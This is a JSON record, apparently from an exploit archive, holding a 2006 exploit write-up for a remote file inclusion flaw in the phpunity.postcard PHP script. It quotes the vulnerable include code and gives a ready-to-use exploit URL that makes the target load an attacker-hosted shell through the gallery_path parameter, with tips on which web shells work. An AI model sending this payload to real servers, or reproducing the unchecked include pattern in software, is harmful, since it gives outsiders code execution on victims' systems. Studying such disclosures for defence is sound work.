{
  "id": "2357",
  "title": "phpunity.postcard - &#039;gallery_path&#039; Remote File Inclusion",
  "cve": "CVE-2006-4869",
  "vuln_type": "unknown",
  "code": "######################################################################################\r\n#                                                                                    #\r\n#     phpunity.postcard (phpunity-postcard.php) Remote File Inclusion Exploit        #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Affected Software .: phpunity.postcard                                         #\r\n#     Vendor ............: http://www.perlunity.de/                                  #\r\n#     Class .............: Remote File Inclusion                                     #\r\n#     Risk ..............: high (Remote File Execution)                              #\r\n#     Found by ..........: Rivertam                                                  #\r\n#     Contact ...........: rivertam88[at]gmail[.]com                                 #\r\n#     Discovered on .....: 04.09.2006 (dd.mm.yyyy)                                   #\r\n#     Published on ......: 13.09.2006 (dd.mm.yyyy)                                   #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Affected File:                                                                 #\r\n#          /phpunity-postcard.php                                                    #\r\n#                                                                                    #\r\n#     Vulnerable Code:                                                               #\r\n#          if(isset($plgallery_epost)) {                                             #\r\n#            $keep_url = \"?\".$_SERVER['QUERY_STRING'];                               #\r\n#              if(isset($gallery_path)) {                                            #\r\n#                include(\"$gallery_path/admin/inc/config.inc.php\");                  #\r\n#              } else {                                                              #\r\n#                include(\"../../phpunity-easygallery/admin/inc/config.inc.php\");     #\r\n#              }                                                                     #\r\n#          }                                                                         #\r\n#                                                                                    #\r\n#     Description:                                                                   #\r\n#     $gallery_path is not defined before being used and in the config it is         #\r\n#     standardly out-commentated. To get into the if request we must define          #\r\n#     $plgallery_epost as 1 (or somethings else)                                     #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Exploit:                                                                       #\r\n#     http://[target]/phpunity-postcard.php?plgallery_epost=1&gallery_path=[shell]?  #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Notice:                                                                        #\r\n#     Works not with the c99-php shell cause if you use it the plgallery_epost=1     #\r\n#     getting lost when you change dir or make another action and then the shell     #\r\n#     unloads.                                                                       #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Greets: Rivertam [National Cracker Crew]                                       #\r\n#                                                                                    #\r\n######################################################################################\r\n#                                                                                    #\r\n#     Greets to:                                                                     #\r\n#     Silver, DOOMER85, Betta splendens and Dye                                      #\r\n#                                                                                    #\r\n######################################################################################\r\n\r\n# milw0rm.com [2006-09-13]",
  "url": "https://www.exploit-db.com/exploits/2357"
}